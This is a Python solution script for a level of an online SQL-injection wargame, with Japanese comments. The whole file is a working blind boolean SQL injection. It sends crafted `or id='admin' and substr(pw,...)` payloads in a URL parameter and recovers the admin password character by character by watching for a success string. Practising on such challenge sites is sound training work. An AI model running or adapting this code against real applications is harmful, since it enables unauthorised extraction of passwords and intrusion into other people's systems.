import requests
import urllib.parse

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookie = ''

#英数字記号をcandidatesに入れる
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_","@","$","!","?","&","#"]
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    #エンコード
    attack_url = url + '?pw=' + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url,headers=headers)
    print(res.text)
    return res

def create_pass_query(pw):
    #攻撃用クエリ生成
    query = "'or id='admin' and substr(pw," + str(len(pw)) + ",1)='" + pw[-1]
    return query

def check_result(res):
    if 'Hello admin' in res.text:
        return True
    return False

####################
###     main     ###
####################

# find pw
fix_pass = ""
is_end = False
while not is_end:
    #パスワード候補を c に入れ検証
    for c in candidates:
        #確定したpassword + c で検証
        try_pass = fix_pass + str(c)
        print(try_pass)

        #try_pass を引数として渡して攻撃クエリを生成
        query = create_pass_query(try_pass)

        #実際にGETメソッドを使ってみる
        res = attack(query)
        #'Hello admin'が出ればfix_passに1文字追加
        if check_result(res):
            fix_pass += c
            break

        #candidatesに最後に入れた文字が'#'なのでそこまでいけば終了
        if c == '#':
            is_end = True
            

print("result: " + fix_pass)
